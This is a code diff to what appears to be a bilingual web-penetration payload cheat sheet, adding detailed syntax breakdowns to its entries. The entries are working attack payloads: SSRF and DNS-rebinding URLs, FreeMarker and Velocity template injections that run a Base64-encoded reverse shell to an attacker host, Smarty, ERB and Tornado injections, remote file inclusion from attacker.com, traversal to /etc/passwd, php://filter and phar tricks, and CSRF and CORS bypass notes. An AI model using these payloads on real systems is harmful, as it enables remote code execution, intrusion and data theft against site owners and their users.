-              { part: 'http://192.168.1.100/admin\nhttp://10.0.0.1:8080/manager\nhttp://172.16.0.1:9200', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'http://192.168.1.100/admin', explanation: { zh: '访问内网主机的管理后台路径', en: 'Access internal admin panel' }, type: 'domain' },
+              { part: 'http://10.0.0.1:8080/manager', explanation: { zh: '访问8080端口的管理应用(Tomcat manager等)', en: 'Access management app on port 8080' }, type: 'domain' },
+              { part: 'http://172.16.0.1:9200/_cat/indices', explanation: { zh: '访问Elasticsearch的索引列表接口', en: 'Access Elasticsearch indices endpoint' }, type: 'domain' },
             ],
         description: { zh: '访问内网服务', en: 'AccessInternal networkService' }, 
         platform: 'all'
@@ -2217,8 +2182,9 @@ Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.examp
         title: { zh: 'DNS重绑定', en: 'DNS Rebinding' }, 
         command: '使用DNS重绑定服务:\nhttp://7f000001.cip.cc (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP',
             syntaxBreakdown: [
-              { part: '使用DNS重绑定服务:\nhttp://7f000001.cip.cc', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' (解析为127.0.0.1)\nhttp://127.0.0.1.nip.io\n第一次解析为外网IP，第二次解析为内网IP', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'http://7f000001.cip.cc', explanation: { zh: '十六进制IP编码域名，解析结果即127.0.0.1', en: 'Hex-encoded IP domain resolving to 127.0.0.1' }, type: 'domain' },
+              { part: 'http://127.0.0.1.nip.io', explanation: { zh: 'nip.io泛解析服务：将IP编码进子域名', en: 'nip.io wildcard DNS service' }, type: 'domain' },
+              { part: '第一次解析为外网IP，第二次解析为内网IP', explanation: { zh: '重绑定原理：两次DNS解析返回不同IP，绕过一次性校验后访问内网', en: 'Rebinding returns different IPs across lookups' }, type: 'technique' },
             ],
         description: { zh: 'DNS重绑定攻击', en: 'DNS Rebinding Attack' }, 
         platform: 'all'
@@ -2664,8 +2630,11 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '5. 反弹Shell', en: '5. Reverse Shell' }, 
         command: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}',
             syntaxBreakdown: [
-              { part: '<#assign', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '<#assign ex="freemarker.template.utility.Execute"?new()>', explanation: { zh: 'FreeMarker指令：实例化模板内置的Execute工具类用于命令执行', en: 'Instantiate freemarker Execute utility for command execution' }, type: 'command' },
+              { part: '${ex(', explanation: { zh: '表达式调用ex对象执行系统命令', en: 'Invoke the Execute object' }, type: 'function' },
+              { part: '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}', explanation: { zh: 'bash花括号展开：echo输出Base64编码的反弹shell命令', en: 'Brace expansion echoes Base64 reverse shell command' }, type: 'value' },
+              { part: '{base64,-d}', explanation: { zh: '解码Base64内容', en: 'Decode Base64 content' }, type: 'command' },
+              { part: '{bash,-i}', explanation: { zh: '以交互式bash执行解码后的命令', en: 'Execute decoded command with interactive bash' }, type: 'command' },
             ],
         description: { zh: '获取反弹Shell', en: 'ObtainReverse Shell' }, 
         platform: 'linux'
@@ -2756,8 +2725,11 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '5. 反弹Shell', en: '5. Reverse Shell' }, 
         command: '#set($rt=$Class.forName("java.lang.Runtime"))\n#set($m=$rt.getDeclaredMethod("getRuntime"))\n#set($obj=$m.invoke(null))\n#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))',
             syntaxBreakdown: [
-              { part: '#set($rt=$Class.forName("java.lang.Runtime"))\n#set($m=$rt.getDeclaredMethod("getRuntime"))\n#set($obj=$m.invoke(null))\n#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '#set($rt=$Class.forName("java.lang.Runtime"))', explanation: { zh: '反射加载java.lang.Runtime类', en: 'Load Runtime class via reflection' }, type: 'command' },
+              { part: '#set($m=$rt.getDeclaredMethod("getRuntime"))', explanation: { zh: '获取getRuntime方法对象', en: 'Get the getRuntime Method object' }, type: 'command' },
+              { part: '#set($obj=$m.invoke(null))', explanation: { zh: '调用方法获取Runtime实例', en: 'Invoke to obtain a Runtime instance' }, type: 'command' },
+              { part: '#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,', explanation: { zh: '定位exec(String)重载并以Runtime实例调用', en: 'Locate exec(String) overload and invoke it' }, type: 'command' },
+              { part: '"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))', explanation: { zh: '执行的命令：bash花括号展开解码Base64反弹shell', en: 'Bash brace expansion decoding Base64 reverse shell' }, type: 'value' },
             ],
         description: { zh: '获取反弹Shell', en: 'ObtainReverse Shell' }, 
         platform: 'linux'
@@ -2768,7 +2740,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '字符串拼接', en: 'stringConcatenate' }, 
         command: '#set($cmd="i"+"d")\n#set($rt=$Class.forName("java.lang.Ru"+"ntime"))\n#set($ex=$rt.getRuntime().exec($cmd))',
             syntaxBreakdown: [
-              { part: '#set($cmd="i"+"d")\n#set($rt=$Class.forName("java.lang.Ru"+"ntime"))\n#set($ex=$', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '#set($cmd="i"+"d")', explanation: { zh: '字符串拼接构造id命令绕过关键字检测', en: 'String concatenation evades keyword detection' }, type: 'command' },
+              { part: '#set($rt=$Class.forName("java.lang.Ru"+"ntime"))', explanation: { zh: '拼接类名"Runtime"绕过类名黑名单', en: 'Concatenated class name evades blacklist' }, type: 'command' },
+              { part: '#set($ex=$rt.getRuntime().exec($cmd))', explanation: { zh: '获取Runtime实例并执行拼接的命令', en: 'Execute the concatenated command' }, type: 'command' },
             ],
         description: { zh: '使用字符串拼接绕过', en: 'UsestringConcatenateBypass' }, 
         platform: 'all'
@@ -2963,8 +2937,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '字符串拼接', en: 'stringConcatenate' }, 
         command: '{system("i"+"d")}\n{system("who"."ami")}\n{system("ca"."t /etc/passwd")}',
             syntaxBreakdown: [
-              { part: '{system("i"+"d")}\n{system("who"."ami")}\n{system("ca"."t', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' /etc/passwd")}', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '{system("i"+"d")}', explanation: { zh: 'Smarty调用system插件执行拼接的id命令', en: 'Smarty system plugin executes concatenated id' }, type: 'function' },
+              { part: '{system("who"."ami")}', explanation: { zh: '拼接whoami绕过关键字过滤', en: 'Concatenated whoami' }, type: 'function' },
+              { part: '{system("ca"."t /etc/passwd")}', explanation: { zh: '拼接cat读取/etc/passwd', en: 'Concatenated cat reads /etc/passwd' }, type: 'function' },
             ],
         description: { zh: '使用字符串拼接绕过', en: 'UsestringConcatenateBypass' }, 
         platform: 'all'
@@ -3174,7 +3149,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '使用handler', en: 'Usehandler' }, 
         command: '{{handler.application.settings}}\n{{handler.get_status()}}\n{{handler.request.remote_ip}}',
             syntaxBreakdown: [
-              { part: '{{handler.application.settings}}\n{{handler.get_status()}}\n', explanation: { zh: '模板表达式注入', en: 'TemplatetableexpressionInjection' }, type: 'value' }
+              { part: '{{handler.application.settings}}', explanation: { zh: '读取Tornado应用配置对象，可能泄露cookie_secret等敏感项', en: 'Read Tornado app settings, may leak cookie_secret' }, type: 'value' },
+              { part: '{{handler.get_status()}}', explanation: { zh: '获取响应状态码，验证表达式已执行', en: 'Get response status to confirm execution' }, type: 'function' },
+              { part: '{{handler.request.remote_ip}}', explanation: { zh: '读取请求来源IP，验证信息泄露', en: 'Read client IP to confirm information disclosure' }, type: 'value' },
             ],
         description: { zh: '通过handler访问', en: 'throughhandlerAccess' }, 
         platform: 'all'
@@ -3331,7 +3308,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '字符串拼接', en: 'stringConcatenate' }, 
         command: '<%= `i` + `d` %>\n<%= system("wh"+"oami") %>\n<%= ("i"+"d").then { |c| system(c) } %>',
             syntaxBreakdown: [
-              { part: '<%= `i` + `d` %>\n<%= system("wh"+"oami") %>\n<%= ("i"+"d").', explanation: { zh: '模板表达式注入', en: 'TemplatetableexpressionInjection' }, type: 'value' }
+              { part: '<%= `i` + `d` %>', explanation: { zh: 'ERB输出Ruby表达式：反引号字符串在Ruby中即命令执行', en: 'ERB evaluates Ruby where backticks execute commands' }, type: 'value' },
+              { part: '<%= system("wh"+"oami") %>', explanation: { zh: '调用system执行拼接的whoami', en: 'system executes concatenated whoami' }, type: 'function' },
+              { part: '<%= ("i"+"d").then { |c| system(c) } %>', explanation: { zh: '拼接命令后经代码块交给system执行', en: 'Concatenated command passed to system' }, type: 'function' },
             ],
         description: { zh: '使用字符串拼接绕过', en: 'UsestringConcatenateBypass' }, 
         platform: 'all'
@@ -3596,7 +3575,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '双写绕过', en: 'Double-write bypass' }, 
         command: '?file=htthttp://p://attacker.com/shell.txt\n?file=http://attackerattacker.com.com/shell.txt',
             syntaxBreakdown: [
-              { part: '?file=htthttp://p://attacker.com/shell.txt\n?file=http://attackerattacker.com.co', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '?file=htthttp://p://attacker.com/shell.txt', explanation: { zh: '协议双写：删除内层http://后剩余字符还原协议头', en: 'Protocol double-write reassembles http://' }, type: 'value' },
+              { part: '?file=http://attackerattacker.com.com/shell.txt', explanation: { zh: '域名双写：删除内层attacker.com后还原真实地址', en: 'Domain double-write reassembles real host' }, type: 'value' },
             ],
         description: { zh: '双写绕过关键字过滤', en: 'Double-write bypass for keyword filtering' }, 
         platform: 'all'
@@ -3605,7 +3585,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '大小写混淆', en: 'Case obfuscation' }, 
         command: '?file=HtTp://attacker.com/shell.txt\n?file=HTTP://attacker.com/shell.txt',
             syntaxBreakdown: [
-              { part: '?file=HtTp://attacker.com/shell.txt\n?file=HTTP://attacker.com/shell.txt', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'HtTp://attacker.com/shell.txt', explanation: { zh: '协议名大小写混写，绕过大小写敏感的协议校验', en: 'Mixed-case protocol evades case-sensitive checks' }, type: 'value' },
+              { part: 'HTTP://attacker.com/shell.txt', explanation: { zh: '协议名全大写变体', en: 'Uppercase protocol variant' }, type: 'value' },
             ],
         description: { zh: '大小写混淆绕过', en: 'Case obfuscation bypass' }, 
         platform: 'all'
@@ -3614,7 +3595,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '协议替换', en: 'ProtocolReplace' }, 
         command: '?file=ftp://attacker.com/shell.txt\n?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt',
             syntaxBreakdown: [
-              { part: '?file=ftp://attacker.com/shell.txt\n?file=php://filter/convert.base64-encode/res', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '?file=ftp://attacker.com/shell.txt', explanation: { zh: 'ftp协议远程包含攻击者服务器上的shell', en: 'Remote inclusion over FTP' }, type: 'value' },
+              { part: 'php://filter/convert.base64-encode', explanation: { zh: 'filter流包装器先做Base64编码', en: 'Filter wrapper applying Base64 encoding' }, type: 'parameter' },
+              { part: 'resource=http://attacker.com/shell.txt', explanation: { zh: '被包装的远程资源：以编码形式读取远程shell内容', en: 'Remote resource read through the filter chain' }, type: 'value' },
             ],
         description: { zh: '使用其他协议', en: 'UseotherProtocol' }, 
         platform: 'all'
@@ -3785,7 +3768,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '双重URL编码', en: 'DoubleURL Encoding' }, 
         command: '?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php\n?file=%70%68%70%3a%2f%2finput',
             syntaxBreakdown: [
-              { part: '?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php\n?file=%70%68', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'php%3A%2F%2Ffilter', explanation: { zh: 'php://filter的URL编码形式(%3A为: %2F为/)', en: 'URL-encoded php://filter scheme' }, type: 'encoding' },
+              { part: 'convert.base64-encode/resource=config.php', explanation: { zh: '解码后拼上filter参数读取config.php源码', en: 'Filter parameters to read config.php source' }, type: 'value' },
+              { part: '%70%68%70%3a%2f%2finput', explanation: { zh: 'php://input的全十六进制小写编码形式', en: 'Fully hex-encoded php://input' }, type: 'encoding' },
             ],
         description: { zh: '双重URL编码绕过', en: 'DoubleURL EncodingBypass' }, 
         platform: 'all'
@@ -3864,7 +3849,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '混合编码', en: 'Mixed encoding' }, 
         command: '..%2f..%c0%af..%2fetc/passwd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd',
             syntaxBreakdown: [
-              { part: '..%2f..%c0%af..%2fetc/passwd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '..%2f..%c0%af..%2fetc/passwd', explanation: { zh: '混合编码的多层目录回溯：%2f为/，%c0%af为过长编码的斜杠', en: 'Mixed-encoding traversal with overlong UTF-8 slash' }, type: 'path' },
+              { part: '%2e%2e/%2e%2e/%2e%2e/etc/passwd', explanation: { zh: '点号(%2e)编码的目录回溯变体', en: 'Encoded dots traversal variant' }, type: 'path' },
             ],
         description: { zh: '混合编码绕过', en: 'Mixed encoding bypass' }, 
         platform: 'all'
@@ -3882,7 +3868,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '点号截断(Windows)', en: 'pointnumberTruncate(Windows)' }, 
         command: '../../../windows/win.ini.\n../../../windows/win.ini...\n../../../boot.ini……',
             syntaxBreakdown: [
-              { part: '../../../windows/win.ini.\n../../../windows/win.ini...\n../../../boot.ini……', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '../../../windows/win.ini.', explanation: { zh: '文件名尾部加点：Windows会忽略尾部点，绕过扩展名校验', en: 'Trailing dot ignored by Windows' }, type: 'path' },
+              { part: '../../../windows/win.ini...', explanation: { zh: '尾部多点变体，效果相同', en: 'Trailing multiple dots variant' }, type: 'path' },
+              { part: '../../../boot.ini……', explanation: { zh: 'Unicode省略号(…)变体，等效多个点', en: 'Unicode ellipsis variant' }, type: 'path' },
             ],
         description: { zh: 'Windows点号截断', en: 'WindowspointnumberTruncate' }, 
         platform: 'windows'
@@ -3949,7 +3937,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '大小写混淆', en: 'Case obfuscation' }, 
         command: '?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php\n?file=PhP://FiLtEr/convert.base64-encode/resource=config.php',
             syntaxBreakdown: [
-              { part: '?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php\n?file=PhP://FiLtEr', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php', explanation: { zh: 'filter链全大写形式读取config.php源码', en: 'Uppercase filter chain reads config.php' }, type: 'encoding' },
+              { part: '?file=PhP://FiLtEr/convert.base64-encode/resource=config.php', explanation: { zh: '协议与关键字混合大小写变体', en: 'Mixed-case scheme variant' }, type: 'encoding' },
             ],
         description: { zh: '大小写混淆绕过', en: 'Case obfuscation bypass' }, 
         platform: 'all'
@@ -3958,7 +3947,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php',
             syntaxBreakdown: [
-              { part: '?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '%70%68%70%3a%2f%2f%66%69%6c%74%65%72', explanation: { zh: 'php://filter整体的百分号编码形式', en: 'Fully percent-encoded php://filter' }, type: 'encoding' },
+              { part: 'convert.base64-encode/resource=config.php', explanation: { zh: '服务端解码后拼上filter参数读取config.php', en: 'Decoded filter parameters reading config.php' }, type: 'value' },
             ],
         description: { zh: 'URL编码绕过', en: 'URL EncodingBypass' }, 
         platform: 'all'
@@ -4114,7 +4104,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: 'URL编码', en: 'URL Encoding' }, 
         command: '?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e',
             syntaxBreakdown: [
-              { part: '?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%7', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e', explanation: { zh: 'data://text/plain的百分号全编码', en: 'Percent-encoded data://text/plain' }, type: 'encoding' },
+              { part: '%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e', explanation: { zh: '编码的<?php system(\\\'id\\\'); ?>：解码后经data协议执行', en: 'Encoded PHP code executed via data wrapper' }, type: 'value' },
             ],
         description: { zh: 'URL编码绕过', en: 'URL EncodingBypass' }, 
         platform: 'all'
@@ -4188,8 +4179,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '使用phar://', en: 'Usephar://' }, 
         command: '?file=phar://uploads/shell.zip/shell.txt&c=id\n# phar://也可以访问zip文件',
             syntaxBreakdown: [
-              { part: '?file=phar://uploads/shell.zip/shell.txt&c=id\n#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' phar://也可以访问zip文件', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'phar://', explanation: { zh: 'phar流协议：访问phar归档内文件', en: 'Phar stream wrapper' }, type: 'parameter' },
+              { part: 'uploads/shell.zip/shell.txt', explanation: { zh: 'phar包内zip归档中的shell文件路径', en: 'Path to shell inside phar zip archive' }, type: 'path' },
+              { part: '&c=id', explanation: { zh: '附加参数c传入要执行的命令id', en: 'Parameter c carrying the command' }, type: 'parameter' },
             ],
         description: { zh: '使用phar://协议', en: 'Usephar://Protocol' }, 
         platform: 'all'
@@ -4198,8 +4190,10 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '压缩包嵌套', en: 'Nested archives' }, 
         command: '# 在zip中嵌套zip\nzip inner.zip shell.txt\nzip outer.zip inner.zip\n\n# 包含\n?file=zip://outer.zip%23inner.zip%23shell.txt&c=id',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 在zip中嵌套zip\nzip inner.zip shell.txt\nzip outer.zip inner.zip\n\n# 包含\n?file=zip://outer.zip%23inner.zip%23shell.txt&c=id', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'zip inner.zip shell.txt', explanation: { zh: '将shell.txt打包进内层zip', en: 'Pack shell.txt into inner zip' }, type: 'command' },
+              { part: 'zip outer.zip inner.zip', explanation: { zh: '内层zip再嵌入外层zip形成嵌套结构', en: 'Nest inner zip inside outer zip' }, type: 'command' },
+              { part: 'zip://outer.zip%23inner.zip%23shell.txt', explanation: { zh: 'zip流协议用%23(#)双重定位嵌套文件', en: 'zip wrapper with encoded # separators' }, type: 'path' },
+              { part: '&c=id', explanation: { zh: '附加参数c传入要执行的命令', en: 'Parameter c carrying the command' }, type: 'parameter' },
             ],
         description: { zh: '压缩包嵌套绕过', en: 'Nested archive bypass' }, 
         platform: 'all'
@@ -4260,8 +4254,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: 'Base64编码', en: 'Base64 Encoding' }, 
         command: '# 将Phar内容Base64编码\n# 然后解码触发',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 将Phar内容Base64编码\n# 然后解码触发', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '将Phar内容Base64编码', explanation: { zh: '步骤1：对Phar字节流Base64编码以绕过内容检测', en: 'Step 1: Base64-encode phar content' }, type: 'concept' },
+              { part: '然后解码触发', explanation: { zh: '步骤2：经php://filter解码读取时触发Phar反序列化', en: 'Step 2: decoding triggers phar deserialization' }, type: 'concept' },
             ],
         description: { zh: 'Base64编码绕过', en: 'Base64 EncodingBypass' }, 
         platform: 'all'
@@ -4270,8 +4264,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '伪协议组合', en: 'Pseudo-ProtocolGroupsCombine' }, 
         command: '?file=php://filter/convert.base64-encode/resource=phar://exploit.phar\n# 组合使用',
             syntaxBreakdown: [
-              { part: '?file=php://filter/convert.base64-encode/resource=phar://exploit.phar\n#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 组合使用', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'php://filter/convert.base64-encode', explanation: { zh: 'filter链Base64编码包装', en: 'Filter wrapper applying Base64 encoding' }, type: 'parameter' },
+              { part: 'resource=phar://exploit.phar', explanation: { zh: '资源指向phar包：读取时触发反序列化', en: 'Resource pointing to phar triggers deserialization' }, type: 'value' },
+              { part: '组合使用', explanation: { zh: 'filter与phar协议组合利用手法', en: 'Combining filter and phar wrappers' }, type: 'technique' },
             ],
         description: { zh: '伪协议组合', en: 'Pseudo-ProtocolGroupsCombine' }, 
         platform: 'all'
@@ -4333,8 +4328,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: 'Session ID预测', en: 'Session ID prediction' }, 
         command: '# 尝试预测Session ID\n# 常见模式: md5(ip.time.random)\n# 暴力枚举Session ID',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 尝试预测Session ID\n# 常见模式: md5(ip.time.random)\n# 暴力枚举Session ID', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '尝试预测Session ID', explanation: { zh: '分析Session ID的生成规律寻找可预测性', en: 'Analyze session ID generation pattern' }, type: 'concept' },
+              { part: 'md5(ip.time.random)', explanation: { zh: '常见弱随机模式：md5拼接IP、时间与随机数', en: 'Weak pattern: md5 of ip.time.random' }, type: 'format' },
+              { part: '暴力枚举Session ID', explanation: { zh: '对可预测的ID空间进行暴力枚举', en: 'Brute-force the predictable ID space' }, type: 'technique' },
             ],
         description: { zh: '预测Session ID', en: 'Predict Session ID' }, 
         platform: 'all'
@@ -4403,7 +4399,8 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '使用self', en: 'Useself' }, 
         command: '?file=/proc/self/environ\n?file=proc/self/environ',
             syntaxBreakdown: [
-              { part: '?file=/proc/self/environ\n?file=proc/self/environ', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '?file=/proc/self/environ', explanation: { zh: '包含当前进程环境变量文件，可将恶意UA写入后包含执行', en: 'Include process environment file' }, type: 'path' },
+              { part: '?file=proc/self/environ', explanation: { zh: '无前导斜杠的相对路径变体', en: 'Relative path variant without leading slash' }, type: 'path' },
             ],
         description: { zh: '使用self引用', en: 'Use self-reference' }, 
         platform: 'linux'
@@ -4479,8 +4476,10 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: 'Token绕过', en: 'Token Bypass' }, 
         command: '1. 检查Token是否可预测\n2. 检查Token是否绑定会话\n3. 检查Token是否在GET参数中泄露\n4. 检查是否有Token重放漏洞',
             syntaxBreakdown: [
-              { part: '1.', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 检查Token是否可预测\n2. 检查Token是否绑定会话\n3. 检查Token是否在GET参数中泄露\n4. 检查是否有Token重放漏洞', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '1. 检查Token是否可预测', explanation: { zh: 'Token熵不足或算法可推算则可被猜测', en: 'Check token predictability' }, type: 'concept' },
+              { part: '2. 检查Token是否绑定会话', explanation: { zh: 'Token未绑定会话则可跨账户重用', en: 'Check session binding' }, type: 'concept' },
+              { part: '3. 检查Token是否在GET参数中泄露', explanation: { zh: 'GET参数会经Referer/日志泄露Token', en: 'Check leakage via GET parameters' }, type: 'concept' },
+              { part: '4. 检查是否有Token重放漏洞', explanation: { zh: 'Token未一次性使用则可重复提交', en: 'Check replay vulnerability' }, type: 'concept' },
             ],
         description: { zh: '绕过Token验证', en: 'BypassTokenVerify' }, 
         platform: 'all'
@@ -4544,8 +4543,9 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: '修改Content-Type', en: 'ModifyContent-Type' }, 
         command: '# 尝试不同的Content-Type\ntext/plain\napplication/x-www-form-urlencoded\napplication/x-www-form-urlencoded; charset=UTF-8',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 尝试不同的Content-Type\ntext/plain\napplication/x-www-form-urlencoded\napplication/x-www-form-urlencoded; charset=UTF-8', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'text/plain', explanation: { zh: '纯文本类型：部分解析逻辑对非表单类型跳过CSRF校验', en: 'Plain text may bypass CSRF checks' }, type: 'format' },
+              { part: 'application/x-www-form-urlencoded', explanation: { zh: '标准表单编码类型', en: 'Standard form encoding' }, type: 'format' },
+              { part: 'charset=UTF-8', explanation: { zh: '追加charset参数绕过精确类型匹配', en: 'Appended charset bypasses exact matching' }, type: 'parameter' },
             ],
         description: { zh: '修改Content-Type绕过', en: 'ModifyContent-TypeBypass' }, 
         platform: 'all'
@@ -4619,8 +4619,10 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
         title: { zh: 'CORS配置错误', en: 'CORS Misconfiguration' }, 
         command: '# Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n# Access-Control-Allow-Origin: *\n允许任意源\n\n# 反射Origin\nAccess-Control-Allow-Origin: [任意Origin]',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n\n# Access-Control-Allow-Origin: *\n允许任意源\n\n# 反射Origin\nAccess-Control-Allow-Origin: [任意Origin]', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
